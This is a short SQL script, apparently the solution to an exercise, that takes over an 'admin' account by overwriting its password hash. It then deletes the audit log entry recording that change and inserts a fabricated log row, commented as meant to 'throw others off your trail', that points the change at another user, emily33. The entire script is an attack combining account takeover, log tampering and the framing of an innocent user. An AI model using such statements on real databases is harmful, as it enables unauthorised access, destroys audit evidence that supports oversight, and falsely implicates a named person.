UPDATE "users"
SET "password" = '982c0381c279d139fd221fce974916e7'
WHERE "username" = 'admin';

DELETE FROM "user_logs"
WHERE "type" = 'update'
AND "new_username" = 'admin';

-- Add false data to throw others off your trail
INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password")
SELECT 'update', 'admin', 'admin', NULL, (SELECT "password" FROM "users" WHERE "username" = 'emily33' LIMIT 1);
